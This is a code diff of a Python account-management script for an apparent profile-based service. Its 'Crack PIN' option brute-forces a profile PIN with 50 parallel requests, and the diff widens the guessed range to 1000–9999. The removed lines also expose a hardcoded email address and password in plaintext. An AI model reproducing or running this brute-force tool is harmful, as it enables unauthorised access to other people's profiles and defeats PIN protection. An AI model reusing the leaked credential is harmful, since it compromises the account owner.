@@ -120,7 +120,7 @@ def post_pin(id: str, pin: int) -> Optional[int]:
 def find_pin(id):
     global stop_searching
     with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = {executor.submit(post_pin, id, pin): pin for pin in range(6600, 9999)}
+        futures = {executor.submit(post_pin, id, pin): pin for pin in range(1000, 9999)}
         for future in as_completed(futures):
             if future.result() is not None:
                 print(Fore.GREEN + "Stopped searching, correct pin found.")
@@ -131,8 +131,8 @@ def find_pin(id):
                 print(Fore.RED + "PIN not found.")
 
 def main():
-    mail = "tulay_erkan13@hotmail.com"
-    passw = "zarpandit13"
+    mail = input("Mail-> ")
+    passw = input("Password-> ")
 
     access_token, refresh_token = login(mail, passw)
 
@@ -148,32 +148,33 @@ def main():
     profiles = fetch_profiles(access_token, refresh_token)
     profile_names = [profile.name for profile in profiles]
 
-    selected_name = input(Fore.CYAN + f"Enter the profile name: ({', '.join(profile_names)}): ")
-    selected_profile = next((profile for profile in profiles if profile.name == selected_name), None)
+    while True:
+        selected_name = input(Fore.CYAN + f"Enter the profile name: ({', '.join(profile_names)}): ")
+        selected_profile = next((profile for profile in profiles if profile.name == selected_name), None)
 
-    if not selected_profile:
-        print(Fore.RED + "Invalid profile name")
-        return
+        if not selected_profile:
+            print(Fore.RED + "Invalid profile name")
+            return
 
-    print(Fore.CYAN + f"Selected profile: {selected_profile.name}")
-    print(Fore.MAGENTA + "1. Delete profile")
-    print(Fore.MAGENTA + "2. Reset profile pin")
-    print(Fore.MAGENTA + "3. Change profile pin")
-    print(Fore.MAGENTA + "4. Crack PIN")
+        print(Fore.CYAN + f"Selected profile: {selected_profile.name}")
+        print(Fore.MAGENTA + "1. Delete profile")
+        print(Fore.MAGENTA + "2. Reset profile pin")
+        print(Fore.MAGENTA + "3. Change profile pin")
+        print(Fore.MAGENTA + "4. Crack PIN")
 
-    choice = input(Fore.CYAN + "Enter your choice (1, 2, 3, or 4): ")
+        choice = input(Fore.CYAN + "Enter your choice (1, 2, 3, or 4): ")
 
-    if choice == "1":
-        delete_profile(selected_profile)
-    elif choice == "2":
-        reset_profile_pin(selected_profile)
-    elif choice == "3":
-        new_pin = input(Fore.CYAN + "Enter new pin: ")
-        change_profile_pin(selected_profile, new_pin)
-    elif choice == "4":
-        find_pin(selected_profile.id)
-    else:
-        print(Fore.RED + "Invalid choice")
+        if choice == "1":
+            delete_profile(selected_profile)
+        elif choice == "2":
+            reset_profile_pin(selected_profile)
+        elif choice == "3":
+            new_pin = input(Fore.CYAN + "Enter new pin: ")
+            change_profile_pin(selected_profile, new_pin)
+        elif choice == "4":
+            find_pin(selected_profile.id)
+        else:
+            print(Fore.RED + "Invalid choice")
 
 if __name__ == "__main__":
     main()
